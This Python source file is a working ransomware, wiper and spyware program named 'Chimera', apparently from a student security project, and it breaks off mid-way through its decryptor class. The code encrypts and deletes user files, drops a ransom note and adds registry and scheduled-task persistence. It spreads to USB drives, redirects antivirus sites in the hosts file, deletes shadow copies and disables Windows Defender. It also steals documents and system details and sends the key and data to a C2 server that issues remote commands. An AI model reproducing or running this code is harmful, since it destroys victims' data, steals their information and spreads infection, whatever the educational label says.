"""
COMPLETE CHIMERA MALWARE
========================
Advanced ransomware, wiper, and spyware combination.
Includes all core malicious methods plus persistence and C2 communication.

⚠️ WARNING: For educational use only in isolated virtual environments!

Features:
- AES-256 File Encryption (Ransomware)
- System Corruption (Wiper) 
- Data Exfiltration (Spyware)
- Persistence Mechanisms
- C2 Communication with Command Handling
- USB Worm Propagation

Author: CADT Cyber Security Project
Date: November 28, 2025
"""

# Standard library imports for file operations, network, and system interaction
import os          # File and directory operations
import time        # Timing and delays
import socket      # Network communication with C2 server
import json        # JSON data serialization for C2 protocol
import sys         # System-specific parameters and functions
import shutil      # High-level file operations (copying for USB propagation)
import subprocess  # Execute system commands (scheduled tasks, vssadmin, etc.)
import winreg      # Windows registry manipulation for persistence
import threading   # Multi-threaded execution of payloads
from cryptography.fernet import Fernet  # AES-256 encryption for ransomware

# === CONFIGURATION PARAMETERS ===
# These constants control the malware's behavior and can be customized
MALWARE_NAME = "WindowsUpdate.exe"  # Disguised name to appear legitimate
C2_SERVER = "192.168.101.73"  # Change to your Kali Linux IP address
C2_PORT = 4444                # Command & Control server port
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.xlsx', '.pptx']  # Files to encrypt

class CompleteChimeraMalware:
    """Main malware class - hybrid ransomware, wiper, and spyware"""
    
    def __init__(self):
        """Initialize malware with encryption keys and tracking variables"""
        # Get the absolute path to this malware file
        self.current_path = os.path.abspath(sys.argv[0])
        
        # Get user's home directory for targeting documents
        self.user_home = os.path.expanduser("~")
        
        # CRITICAL FIX: Use persistent encryption key
        # If a key file exists from previous run, load it
        # Otherwise generate new key and save it
        # This ensures the SAME key is used across reboots/restarts
        self.key_file = os.path.join(os.getcwd(), ".chimera_key_persist.dat")
        self.encryption_key = self._get_or_create_persistent_key()
        self.cipher_suite = Fernet(self.encryption_key)
        
        # Track statistics for attack report
        self.encrypted_count = 0      # Number of files encrypted
        self.stolen_data_count = 0    # Number of documents exfiltrated
        
        # Control flag for C2 communication loop
        self.keep_alive = True
    
    def _get_or_create_persistent_key(self):
        """
        Get persistent encryption key from file, or create new one
        
        This ensures the same key is used even if malware restarts.
        Critical for:
        1. Decrypting files after system reboot
        2. Maintaining same key if malware is stopped/restarted
        3. Allowing victim to decrypt files with consistent key
        
        Returns:
            bytes: The persistent Fernet encryption key
        """
        try:
            # Try to load existing key from hidden file
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    key = f.read()
                print(f"[+] Loaded persistent encryption key from {self.key_file}")
                return key
        except:
            pass
        
        # No existing key found - generate new one
        key = Fernet.generate_key()
        
        # Save key to persistent file
        try:
            with open(self.key_file, 'wb') as f:
                f.write(key)
            # Hide the file on Windows
            try:
                subprocess.call(f'attrib +h "{self.key_file}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            print(f"[+] Generated and saved persistent encryption key")
        except:
            # If can't save, at least we have the key in memory
            pass
        
        return key
        
    # ==========================================
    # PERSISTENCE MECHANISMS (FIXED)
    # ==========================================
    
    def establish_persistence(self):
        """
        Establish multiple persistence mechanisms to ensure malware survives reboots
        Uses two techniques: Registry Run Key and Scheduled Tasks
        """
        print("[+] Establishing Persistence...")
        
        # TECHNIQUE 1: Registry Run Key Persistence
        # This makes the malware execute every time the user logs in
        try:
            # Open the registry key that controls startup programs
            # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            
            # Add our malware with a legitimate-sounding name
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, self.current_path)
            
            # Close the registry key properly
            winreg.CloseKey(key)
            print("    [+] Registry persistence established")
        except Exception as e:
            print(f"    [-] Registry failed: {e}")

        # TECHNIQUE 2: Scheduled Task Persistence
        # This makes the malware run every hour automatically
        try:
            # Use Windows schtasks command to create a scheduled task
            # /tn = task name (disguised as Microsoft service)
            # /tr = task run (path to our malware)
            # /sc hourly = schedule hourly execution
            # /f = force creation (overwrite if exists)
            cmd = f'schtasks /create /tn "MicrosoftWindowsUpdate" /tr "{self.current_path}" /sc hourly /f'
            subprocess.call(cmd, shell=True)
            print("    [+] Scheduled task created")
        except Exception as e:
            print(f"    [-] Task failed: {e}")

    # ==========================================
    # PROPAGATION MECHANISMS  
    # ==========================================
    
    def propagate_usb_worm(self):
        """
        USB Worm Propagation - Spread to removable drives
        Copies malware to USB drives and creates autorun.inf for automatic execution
        """
        print("[+] Propagating via USB...")
        
        # Check all possible drive letters (D: through Z:)
        # C: is typically the system drive, so we skip it
        drives = ['%s:' % d for d in "DEFGHIJKLMNOPQRSTUVWXYZ"]
        infected_drives = 0
        
        # Iterate through each potential drive letter
        for drive in drives:
            if os.path.exists(drive):
                try:
                    # Copy malware to USB
                    dest = os.path.join(drive, MALWARE_NAME)
                    shutil.copy2(self.current_path, dest)
                    
                    # Create autorun.inf
                    autorun_path = os.path.join(drive, "autorun.inf")
                    with open(autorun_path, "w") as f:
                        f.write("[autorun]\n")
                        f.write("open=WindowsUpdate.exe\n")
                        f.write("action=Open folder to view files\n")
                        f.write("shell\\open=Open\n")
                        f.write("shell\\open\\Command=WindowsUpdate.exe\n")
                    
                    # Hide files
                    subprocess.call(f'attrib +h +s "{dest}"', shell=True)
                    subprocess.call(f'attrib +h +s "{autorun_path}"', shell=True)
                    
                    infected_drives += 1
                    print(f"    [+] Infected USB drive: {drive}")
                    
                except Exception:
                    continue
        
        print(f"[+] USB Propagation: Infected {infected_drives} drives")

    # ==========================================
    # CORE MALICIOUS METHOD 1: FILE ENCRYPTION (RANSOMWARE)
    # ==========================================
    
    def encrypt_file(self, file_path):
        """
        Encrypt a single file using AES-256 encryption
        Args:
            file_path: Full path to the file to encrypt
        Returns:
            True if encryption succeeded, False otherwise
        """
        try:
            # Read the original file content in binary mode
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Encrypt the data using AES-256 (Fernet)
            encrypted_data = self.cipher_suite.encrypt(original_data)
            
            # Save the encrypted data with a new extension
            encrypted_path = file_path + ".chimera_encrypted"
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
                # CRITICAL: Flush to disk immediately to trigger file system events
                # This ensures aegis_real.py's watchdog can detect the modification
                f.flush()
                os.fsync(f.fileno())
            
            # Small delay to ensure file system event is registered
            time.sleep(0.01)
            
            # Delete the original unencrypted file
            os.remove(file_path)
            return True
        except Exception:
            # Silently fail if file cannot be encrypted (permissions, in use, etc.)
            return False

    def payload_ransomware(self):
        """Encrypt user files and demand ransom"""
        print("[+] Starting Ransomware Encryption...")
        
        # Reduced target scope for safer testing
        target_folders = [
            os.path.join(self.user_home, "Documents", "TestVictim"),  # Create this folder first for testing
            os.path.join(self.user_home, "Desktop")
        ]
        
        self.encrypted_count = 0
        
        for folder in target_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                            file_path = os.path.join(root, file)
                            if self.encrypt_file(file_path):
                                self.encrypted_count += 1
                                if self.encrypted_count % 10 == 0:
                                    print(f"    [+] Encrypted {self.encrypted_count} files...")
                                # Small delay between encryptions (realistic ransomware behavior)
                                # This also ensures aegis detection system can process events
                                time.sleep(0.05)
        
        # Create ransom note
        self.create_ransom_note()
        
        # CRITICAL: Send encryption key to C2 server immediately
        # This ensures the key is backed up even if local report is lost
        if self.encrypted_count > 0:
            self.send_encryption_key_to_c2()
        
        print(f"[+] Ransomware: Encrypted {self.encrypted_count} files")
        return self.encrypted_count

    def create_ransom_note(self):
        """Create ransom note (FIXED KEY DISPLAY)"""
        # FIX: We now decode the key to string so you can copy it exactly
        key_string = self.encryption_key.decode()
        
        ransom_note = f"""
        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
        
        What happened?
        ==============
        Your important files have been encrypted with military-grade AES-256 encryption.
        The following file types were affected: {', '.join(TARGET_EXTENSIONS)}
        
        Total files encrypted: {self.encrypted_count}
        
        How to recover your files?
        ==========================
        Use this KEY to decrypt your files (COPY EXACTLY):
        {key_string}
        
        Run command: python chimera_real.py --decrypt <KEY>
        
        ⚠️ WARNING:
        - Do NOT modify encrypted files
        - Do NOT use third-party recovery tools
        
        Contact: support@chimera.com (Educational Purpose Only)
        """
        
        # Create ransom note in multiple locations
        locations = [
            os.path.join(self.user_home, "Desktop", "READ_ME_FOR_DECRYPT.txt"),
            os.path.join(self.user_home, "Documents", "READ_ME_FOR_DECRYPT.txt")
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
            except:
                pass

    # ==========================================
    # CORE MALICIOUS METHOD 2: SYSTEM CORRUPTION (WIPER)
    # ==========================================
    
    def payload_system_corruption(self):
        """
        CORE MALICIOUS METHOD #2: System Corruption (Wiper)
        Corrupt critical system files and disable security features
        This makes the system unstable and prevents recovery
        """
        print("[+] Starting System Corruption...")
        
        # Counter for successful corruption actions
        corruption_actions = 0
        
        # ACTION 1: Corrupt Windows hosts file to block security websites
        # The hosts file maps domain names to IP addresses
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            if os.path.exists(hosts_path):
                malicious_entries = [
                    "\n# CHIMERA MALWARE REDIRECTS - DO NOT REMOVE",
                    "127.0.0.1 microsoft.com",
                    "127.0.0.1 windowsupdate.microsoft.com",
                    "127.0.0.1 live.com",
                    "127.0.0.1 antivirus.com",
                    "127.0.0.1 avast.com",
                    "127.0.0.1 bitdefender.com",
                    "127.0.0.1 kaspersky.com",
                    "127.0.0.1 mcafee.com",
                    "127.0.0.1 symantec.com",
                    "127.0.0.1 norton.com",
                    "127.0.0.1 malwarebytes.com"
                ]
                
                # REAL IMPLEMENTATION: Actually write to hosts file
                with open(hosts_path, 'a') as f:
                    f.write('\n'.join(malicious_entries))
                    f.flush()  # Ensure it's written to disk
                    os.fsync(f.fileno())  # Force OS to write to disk
                
                corruption_actions += 1
                print("    [+] Corrupted hosts file - blocked security sites")
        except PermissionError:
            print("    [-] Hosts file corruption failed: Need administrator privileges")
        except Exception as e:
            print(f"    [-] Hosts file corruption failed: {e}")

        # ACTION 2: Delete volume shadow copies (prevents file recovery)
        # This requires administrator privileges to execute
        try:
            result = subprocess.call("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if result == 0:
                corruption_actions += 1
                print("    [+] Deleted volume shadow copies (recovery disabled)")
            else:
                # Try alternative method using wmic
                result2 = subprocess.call("wmic shadowcopy delete /nointeractive", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result2 == 0:
                    corruption_actions += 1
                    print("    [+] Deleted volume shadow copies via WMIC")
        except Exception as e:
            print(f"    [-] Shadow copy deletion failed: {e}")

        # ACTION 3: Disable Windows Defender real-time protection
        # These PowerShell commands actually disable Windows Defender (requires admin)
        try:
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "Set-MpPreference -DisableScriptScanning $true"'
            ]
            
            success_count = 0
            for cmd in commands:
                result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result == 0:
                    success_count += 1
            
            if success_count > 0:
                corruption_actions += 1
                print(f"    [+] Disabled {success_count}/5 Windows Defender protections")
        except Exception as e:
            print(f"    [-] Defender disabling failed: {e}")

        # ACTION 4: Create corruption markers
        corruption_folders = [
            os.path.join(self.user_home, "AppData", "Local", "Temp"),
            os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
            os.path.join(self.user_home, "AppData", "Local", "Microsoft", "Windows")
        ]
        
        for folder in corruption_folders:
            if os.path.exists(folder):
                try:
                    marker_file = os.path.join(folder, "CORRUPTED_BY_CHIMERA.txt")
                    with open(marker_file, 'w') as f:
                        f.write(f"System compromised by Chimera malware\nTime: {time.ctime()}\n")
                    corruption_actions += 1
                except:
                    pass

        print(f"[+] System Corruption: Completed {corruption_actions} destructive actions")
        return corruption_actions

    # ==========================================
    # CORE MALICIOUS METHOD 3: DATA EXFILTRATION (SPYWARE)
    # ==========================================
    
    def payload_data_exfiltration(self):
        """
        CORE MALICIOUS METHOD #3: Data Exfiltration (Spyware)
        Steal sensitive information from the victim's computer
        Collects system info, document samples, network config, and browser data
        """
        print("[+] Starting Data Exfiltration...")
        
        # Collect all types of sensitive data into a structured dictionary
        stolen_data = {
            "system_info": self.collect_system_info(),           # Computer name, user, OS version
            "document_samples": self.steal_document_samples(),   # First 500 bytes from docs
            "network_info": self.collect_network_info(),         # IP address, network config
            "browser_data": self.find_browser_data(),            # Browser installation locations
            "timestamp": time.time()                             # When the theft occurred
        }
        
        # Save locally
        self.save_stolen_data(stolen_data)
        
        print(f"[+] Data Exfiltration: Stole {self.stolen_data_count} document samples")
        return self.stolen_data_count

    def collect_system_info(self):
        """Collect comprehensive system information"""
        info = {
            "computer_name": socket.gethostname(),
            "username": os.getlogin(),
            "user_home": self.user_home,
            "windows_version": str(sys.getwindowsversion()),
            "current_time": time.ctime(),
            "malware_path": self.current_path,
            "processor_count": os.cpu_count()
        }
        return info

    def steal_document_samples(self):
        """Steal samples from documents"""
        samples = {}
        self.stolen_data_count = 0
        
        document_folders = [
            os.path.join(self.user_home, "Documents"),
            os.path.join(self.user_home, "Desktop"),
            os.path.join(self.user_home, "Downloads")
        ]
        
        for folder in document_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if any(file.endswith(ext) for ext in ['.txt', '.docx', '.pdf']):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    sample_data = f.read(200)  # First 200 bytes
                                
                                samples[file] = {
                                    "path": file_path,
                                    "size": os.path.getsize(file_path),
                                    "sample_hex": sample_data.hex(),
                                    "sample_text": sample_data[:100].decode('utf-8', errors='ignore')
                                }
                                
                                self.stolen_data_count += 1
                                
                                if self.stolen_data_count >= 15:  # Limit for demo
                                    return samples
                                    
                            except:
                                continue
        return samples

    def collect_network_info(self):
        """Collect network configuration"""
        info = {}
        try:
            info["hostname"] = socket.gethostname()
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
            
            # Get network adapters info
            try:
                output = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
                info["ipconfig"] = output
            except:
                info["ipconfig"] = "Unable to retrieve"
                
        except Exception as e:
            info["error"] = str(e)
        
        return info

    def find_browser_data(self):
        """Locate browser data locations"""
        browsers = {}
        
        browser_paths = {
            "chrome": os.path.join(self.user_home, "AppData", "Local", "Google", "Chrome"),
            "edge": os.path.join(self.user_home, "AppData", "Local", "Microsoft", "Edge"),
            "firefox": os.path.join(self.user_home, "AppData", "Roaming", "Mozilla", "Firefox")
        }
        
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                browsers[browser] = {
                    "path": path,
                    "exists": True,
                    "size": self.get_folder_size(path)
                }
            else:
                browsers[browser] = {"exists": False}
        
        return browsers

    def get_folder_size(self, folder):
        """Calculate folder size"""
        try:
            total_size = 0
            for dirpath, dirnames, filenames in os.walk(folder):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    try:
                        total_size += os.path.getsize(filepath)
                    except:
                        pass
            return total_size
        except:
            return 0

    def save_stolen_data(self, stolen_data):
        """Save stolen data to local file"""
        try:
            exfil_file = os.path.join(os.getcwd(), "chimera_exfiltrated_data.json")
            with open(exfil_file, 'w', encoding='utf-8') as f:
                json.dump(stolen_data, f, indent=4, ensure_ascii=False)
            print("    [+] Saved stolen data locally")
        except Exception as e:
            print(f"    [-] Failed to save stolen data: {e}")

    def send_encryption_key_to_c2(self):
        """
        Send encryption key to C2 server for backup
        
        This is CRITICAL functionality:
        - Ensures decryption key is never lost
        - Stores key on attacker's C2 server
        - Multiple retry attempts with exponential backoff
        - Falls back to local storage if C2 unavailable
        
        Key is sent in JSON format:
        {
            "type": "encryption_key",
            "key": "<base64_key_string>",
            "bot_id": "<hostname_username>",
            "encrypted_files": <count>,
            "timestamp": <unix_timestamp>
        }
        """
        print("[+] Sending encryption key to C2 server...")
        
        # Prepare key message
        key_string = self.encryption_key.decode()  # Convert bytes to string
        key_message = {
            "type": "encryption_key",
            "key": key_string,
            "bot_id": f"{socket.gethostname()}_{os.getlogin()}",
            "computer_name": socket.gethostname(),
            "username": os.getlogin(),
            "encrypted_files": self.encrypted_count,
            "timestamp": time.time()
        }
        
        # Try multiple times with exponential backoff
        max_retries = 5
        retry_delays = [1, 2, 5, 10, 30]  # Seconds between retries
        
        for attempt in range(max_retries):
            try:
                # Create new socket for key exfiltration
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10.0)  # 10 second timeout
                
                # Connect to C2 server
                s.connect((C2_SERVER, C2_PORT))
                
                # Send key message
                s.send(json.dumps(key_message).encode())
                
                # Wait for acknowledgment
                try:
                    ack = s.recv(1024).decode()
                    if ack:
                        print(f"    [+] Encryption key sent to C2 server successfully")
                        print(f"    [+] Key backed up on: {C2_SERVER}:{C2_PORT}")
                        s.close()
                        return True
                except:
                    pass  # No ACK needed, just send
                
                s.close()
                print(f"    [+] Encryption key sent to C2 server (attempt {attempt + 1})")
                return True
                
            except (socket.error, socket.timeout, ConnectionRefusedError) as e:
                # Connection failed
                if attempt < max_retries - 1:
                    delay = retry_delays[attempt]
                    print(f"    [-] C2 connection failed (attempt {attempt + 1}/{max_retries}), retrying in {delay}s...")
                    time.sleep(delay)
                else:
                    print(f"    [-] Failed to send key to C2 after {max_retries} attempts")
                    print(f"    [!] Key ONLY saved locally - ensure you backup the report file!")
            except Exception as e:
                print(f"    [-] Unexpected error sending key: {e}")
                break
        
        # Fallback: Ensure key is saved locally
        try:
            fallback_file = os.path.join(os.getcwd(), "ENCRYPTION_KEY_BACKUP.txt")
            with open(fallback_file, 'w') as f:
                f.write(f"ENCRYPTION KEY BACKUP\n")
                f.write(f"{'='*50}\n")
                f.write(f"Bot: {socket.gethostname()}_{os.getlogin()}\n")
                f.write(f"Encrypted Files: {self.encrypted_count}\n")
                f.write(f"Timestamp: {time.ctime()}\n")
                f.write(f"{'='*50}\n")
                f.write(f"KEY: {key_string}\n")
            print(f"    [+] Fallback: Key saved to {fallback_file}")
        except:
            pass
        
        return False

    # ==========================================
    # C2 COMMUNICATION WITH COMMAND HANDLING
    # ==========================================
    
    def handle_c2_communication(self):
        """
        Command & Control (C2) Communication Handler
        Establishes connection to remote C2 server and waits for commands
        Sends bot information and receives remote execution commands
        Implements automatic retry on connection failure with exponential backoff
        """
        print("[+] Starting C2 Communication Handler...")
        
        retry_count = 0
        max_retry_delay = 300  # Maximum 5 minutes between retries
        
        # Main C2 loop - keeps trying to connect until shutdown
        while self.keep_alive:
            try:
                # Calculate retry delay with exponential backoff
                if retry_count > 0:
                    delay = min(30 * (2 ** (retry_count - 1)), max_retry_delay)
                    print(f"    [*] Retry attempt {retry_count}, waiting {delay}s before reconnecting...")
                    time.sleep(delay)
                
                # Create socket connection
                print(f"    [*] Attempting to connect to C2: {C2_SERVER}:{C2_PORT}")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30.0)
                s.connect((C2_SERVER, C2_PORT))
                
                # Reset retry counter on successful connection
                retry_count = 0
                
                # Send handshake
                handshake = {
                    "type": "handshake",
                    "bot_id": f"{socket.gethostname()}_{os.getlogin()}",
                    "computer_name": socket.gethostname(),
                    "username": os.getlogin(),
                    "malware_version": "Chimera_Complete_v2.0",
                    "timestamp": time.time(),
                    "status": "ACTIVE",
                    "encrypted_files": self.encrypted_count,
                    "encryption_key": self.encryption_key.decode()  # Include key in handshake
                }
                
                s.send(json.dumps(handshake).encode())
                print("    [+] Connected to C2 server, waiting for commands...")
                
                # Listen for commands
                while self.keep_alive:
                    try:
                        data = s.recv(4096).decode()
                        if not data:
                            print("    [!] C2 connection closed by server")
                            break
                            
                        command_data = json.loads(data)
                        command = command_data.get('command', '')
                        parameters = command_data.get('parameters', '')
                        
                        print(f"    [+] Received command: {command} {parameters}")
                        
                        # Execute command
                        result = self.execute_command(command, parameters)
                        
                        # Send result back with bot_id for better C2 tracking
                        response = {
                            "type": "command_result",
                            "command": command,
                            "result": result,
                            "timestamp": time.time(),
                            "bot_id": f"{socket.gethostname()}_{os.getlogin()}"
                        }
                        
                        try:
                            s.send(json.dumps(response).encode())
                            print(f"    [+] Executed: {command}")
                            print(f"    [+] Result sent to C2")
                        except (BrokenPipeError, ConnectionResetError):
                            print("    [!] Failed to send response, connection lost")
                            break
                        
                        # Send exfiltrated data if available
                        if command == "exfiltrate":
                            stolen_data = self.collect_exfiltration_data()
                            exfil_message = {
                                "type": "exfiltration",
                                "data": stolen_data,
                                "file_count": self.encrypted_count,
                                "stolen_samples": self.stolen_data_count
                            }
                            try:
                                s.send(json.dumps(exfil_message).encode())
                            except (BrokenPipeError, ConnectionResetError):
                                print("    [!] Failed to send exfiltration data")
                                break
                            
                    except socket.timeout:
                        continue
                    except json.JSONDecodeError as e:
                        print(f"    [-] Invalid JSON from C2: {e}")
                        continue
                    except Exception as e:
                        print(f"    [-] Command handling error: {e}")
                        break
                
                s.close()
                
            except (ConnectionRefusedError, socket.timeout) as e:
                retry_count += 1
                print(f"    [-] C2 connection failed: {e}")
            except Exception as e:
                retry_count += 1
                print(f"    [-] C2 error: {e}")
                
            # Limit retry attempts
            if retry_count > 10:
                print(f"    [!] Too many failed connection attempts, waiting 5 minutes...")
                time.sleep(300)
                retry_count = 0

    def execute_command(self, command, parameters):
        """
        Execute commands received from C2 server
        Supports multiple command types for remote control of the malware
        
        Args:
            command: The command to execute (encrypt_files, exfiltrate, etc.)
            parameters: Optional parameters for the command
        Returns:
            Dictionary with command result (will be sent back to C2 as JSON)
        """
        result = ""
        try:
            # COMMAND: Trigger ransomware encryption
            if command == "encrypt_files":
                count = self.payload_ransomware()
                result = f"✓ Ransomware executed successfully\nFiles encrypted: {count}\nEncryption key sent to C2 server"
            
            # COMMAND: Trigger system corruption (wiper)
            elif command == "corrupt_system":
                count = self.payload_system_corruption()
                result = f"✓ System corruption executed\nDestructive actions completed: {count}\nTargets: Hosts file, Shadow copies, Windows Defender"
            
            # COMMAND: Trigger data exfiltration (spyware)
            elif command == "exfiltrate":
                count = self.payload_data_exfiltration()
                result = f"✓ Data exfiltration completed\nDocument samples stolen: {count}\nData includes: System info, documents, network config, browser data"
            
            # COMMAND: Get basic system information
            elif command == "system_info":
                info = self.collect_system_info()
                result = f"""✓ System Information Collected:

Computer Name: {info.get('computer_name', 'N/A')}
Username: {info.get('username', 'N/A')}
User Home: {info.get('user_home', 'N/A')}
Windows Version: {info.get('windows_version', 'N/A')}
Processor Count: {info.get('processor_count', 'N/A')}
Malware Path: {info.get('malware_path', 'N/A')}
Current Time: {info.get('current_time', 'N/A')}"""
            
            # COMMAND: Check if bot is alive
            elif command == "status":
                result = f"""✓ Bot Status Report:

Bot ID: {socket.gethostname()}_{os.getlogin()}
Status: ACTIVE
Files Encrypted: {self.encrypted_count}
Documents Exfiltrated: {self.stolen_data_count}
C2 Connection: ACTIVE
Persistence: Established
Last Activity: {time.ctime()}"""
            
            # COMMAND: Trigger USB worm propagation
            elif command == "propagate":
                self.propagate_usb_worm()
                result = "✓ USB propagation executed\nScanned drives: D-Z\nMalware copied to available USB drives\nAutorun files created"
            
            # COMMAND: Shutdown the malware gracefully
            elif command == "shutdown":
                self.keep_alive = False
                result = "✓ Shutdown command received\nTerminating malware process\nClosing C2 connection"
            
            # COMMAND: Execute full attack sequence (all payloads at once)
            # This is triggered by the C2 'autoexecute' command
            elif command == "auto_execute":
                try:
                    # Run the full attack in a background thread to avoid blocking C2 communication
                    threading.Thread(target=self._auto_execute_all, daemon=True).start()
                    result = f"""✓ Auto-Execute Started

Initializing full attack sequence...
Persistence: Establishing (Registry + Scheduled Task)
Propagation: Deploying USB worm
Payloads: Launching ransomware, wiper, spyware

Attack running in background. Use 'status' to check progress."""
                except Exception as e:
                    result = f"✖ Failed to start auto-execution\nError: {e}"
            
            # COMMAND: Unknown - return error
            else:
                result = f"✖ Unknown command: {command}\nUse 'help' on C2 server to see available commands"
                
        except Exception as e:
            result = f"✖ Command execution failed\nError: {str(e)}"
        
        return result

    def collect_exfiltration_data(self):
        """Collect data for exfiltration"""
        return {
            "system_info": self.collect_system_info(),
            "document_samples": self.steal_document_samples(),
            "network_info": self.collect_network_info(),
            "file_count": self.encrypted_count,
            "timestamp": time.time()
        }

    def _auto_execute_all(self):
        """
        Internal helper to run the full attack sequence without starting a second C2 handler.
        This runs persistence, propagation, and the three core payloads (encryption, corruption, exfiltration)
        concurrently in background threads.
        """
        try:
            print("[+] Auto-execution: Establishing persistence...")
            try:
                self.establish_persistence()
            except Exception as e:
                print(f"    [-] Persistence error during auto_execute: {e}")

            print("[+] Auto-execution: Propagating via USB...")
            try:
                self.propagate_usb_worm()
            except Exception as e:
                print(f"    [-] Propagation error during auto_execute: {e}")

            print("[+] Auto-execution: Launching core payloads...")
            threads = []
            threads.append(threading.Thread(target=self.payload_ransomware, daemon=True))
            threads.append(threading.Thread(target=self.payload_system_corruption, daemon=True))
            threads.append(threading.Thread(target=self.payload_data_exfiltration, daemon=True))

            for t in threads:
                t.start()
                time.sleep(0.2)

            # Optionally wait a short time for initial activity
            for t in threads:
                t.join(timeout=60)

            # Create attack report after initial payloads
            try:
                self.create_attack_report()
                print("[+] Auto-execution: Initial payloads complete and report created")
            except Exception as e:
                print(f"    [-] Failed to create attack report: {e}")

            return True
        except Exception as e:
            print(f"[!] Auto-execution encountered an error: {e}")
            return False

    # ==========================================
    # MAIN EXECUTION FLOW
    # ==========================================
    
    def execute_malware(self):
        """Main malware execution sequence"""
        print("""
        ╔═══════════════════════════════════════════════╗
        ║              CHIMERA MALWARE                  ║
        ║         Complete Attack Sequence              ║
        ║         Educational Purpose Only              ║
        ╚═══════════════════════════════════════════════╝
        """)
        
        # Phase 1: Persistence
        self.establish_persistence()
        time.sleep(1)
        
        # Phase 2: Propagation
        self.propagate_usb_worm()
        time.sleep(1)
        
        # Phase 3: Core Malicious Payloads in parallel
        print("\n[+] Executing Core Malicious Payloads...")
        
        threads = []
        
        encryption_thread = threading.Thread(target=self.payload_ransomware)
        corruption_thread = threading.Thread(target=self.payload_system_corruption)
        exfiltration_thread = threading.Thread(target=self.payload_data_exfiltration)
        c2_thread = threading.Thread(target=self.handle_c2_communication)
        
        threads.extend([encryption_thread, corruption_thread, exfiltration_thread, c2_thread])
        
        # Start all threads
        for thread in threads:
            thread.daemon = True
            thread.start()
            time.sleep(0.5)
        
        # Wait for initial payload completion
        for i, thread in enumerate(threads[:3]):  # First 3 are payload threads
            thread.join(timeout=60)
        
        # Create final report
        self.create_attack_report()
        
        print("""
        ╔═══════════════════════════════════════════════╗
        ║             INITIAL ATTACK COMPLETE           ║
        ║         C2 Communication Active               ║
        ║         Waiting for remote commands...        ║
        ╚═══════════════════════════════════════════════╝
        """)
        
        # Keep C2 thread alive
        try:
            while self.keep_alive:
                time.sleep(1)
        except KeyboardInterrupt:
            self.keep_alive = False
            print("\n[!] Malware shutdown initiated...")

    def create_attack_report(self):
        """Create detailed attack report (FIXED KEY STORAGE)"""
        # FIX: Decode the key to a standard string
        key_str = self.encryption_key.decode()
        
        report = f"""
        CHIMERA MALWARE - ATTACK REPORT
        ================================
        Timestamp: {time.ctime()}
        Target: {socket.gethostname()} - {os.getlogin()}
        
        ATTACK METRICS:
        - Files Encrypted: {self.encrypted_count}
        - Documents Stolen: {self.stolen_data_count}
        - Persistence Established: Yes
        - USB Propagation: Active
        - C2 Communication: ACTIVE
        
        DECRYPTION KEY (SAVE THIS SAFE - COPY EXACTLY):
        {key_str}
        
        STATUS: Waiting for C2 commands...
        
        REMINDER: This is for educational purposes only!
        """
        
        report_file = os.path.join(os.getcwd(), "chimera_attack_report.txt")
        with open(report_file, 'w') as f:
            f.write(report)
        print(f"[+] Attack report saved: {report_file}")

# ==========================================
# DECRYPTION TOOL (FIXED)
# ==========================================

class ChimeraDecryptor:
    """
    Decryption Tool for Chimera Ransomware
    
    This class provides functionality to decrypt files that were encrypted
    by the Chimera malware. It requires the original encryption key that
    was generated during the attack.
    
    Usage:
        python chimera_real.py --decrypt <encryption_key>
    
    The key can be found in:
        - chimera_attack_report.txt
        - READ_ME_FOR_DECRYPT.txt
    """
    
    def __init__(self, encryption_key):
        """
        Initialize the decryptor with the encryption key
        
        Args:
            encryption_key: The Fernet key (bytes) used for encryption
        """
        # Create a Fernet cipher suite using the provided key
        # This same key was used to encrypt the files
        self.cipher_suite = Fernet(encryption_key)
    
    def decrypt_file(self, encrypted_path):
        """
        Decrypt a single file and restore original filename
        
        Args:
            encrypted_path: Path to the .chimera_encrypted file
        Returns:
            True if decryption succeeded, False otherwise
        """
        try:
            # Remove the .chimera_encrypted extension to get original filename
            original_path = encrypted_path.replace('.chimera_encrypted', '')
            
            # Read the encrypted file content
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            # Decrypt the data using the Fernet cipher
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            # Write the decrypted data back to the original filename
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # Delete the encrypted file (cleanup)
            os.remove(encrypted_path)
            return True
            
        except Exception as e:
            # Only print first error with details, suppress repeated errors
